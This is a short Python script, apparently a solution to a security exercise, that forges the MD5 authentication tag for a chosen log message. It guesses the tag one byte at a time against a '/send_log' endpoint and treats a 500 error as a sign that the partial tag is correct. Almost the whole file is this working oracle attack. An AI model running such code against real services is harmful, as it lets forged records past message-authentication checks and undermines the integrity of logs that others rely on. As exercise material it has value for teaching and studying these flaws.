import os
import requests

def get_tag(log: str) -> str:

    # Variables de entorno
    raw_url = os.environ.get("LOG_SERVICE_URL", "http://localhost")
    port = int(os.environ.get("LOG_SERVICE_PORT", 8080))

    # Asegura que la URL tenga esquema (http:// o https://)
    if not raw_url.startswith("http://") and not raw_url.startswith("https://"):
        raw_url = "http://" + raw_url

    # Longitud del tag de MD5 en bytes
    TAG_LENGTH = 16
    
    known_tag_bytes = bytearray()
    
    # Bucle principal, para los 16 bytes del tag
    for i in range(TAG_LENGTH):
        
        # Bucle de prueba para los 256 valores en byte actual
        for byte_guess in range(256):
            # Construimos el tag de prueba
            # known_tag_bytes: los bytes que ya encontramos
            test_tag = known_tag_bytes + bytearray([byte_guess])
            
            # Convertimos el tag a formato hexadecimal para el JSON
            test_tag_hex = test_tag.hex()
            
            request_body = {
                "log": log,
                "tag": test_tag_hex
            }
            
            response = requests.post(f"{raw_url}:{port}/send_log", json=request_body)

            # Aprovechamos el segundo bug, nos dan error 500 cuando el hash va "por buen camino" pero está corto.
            # Al ver esto, solo saltamos el bucle y seguimos con el proximo byte.
            if (response.status_code in [200, 500]):
                known_tag_bytes.append(byte_guess)
                break
        
    return known_tag_bytes.hex()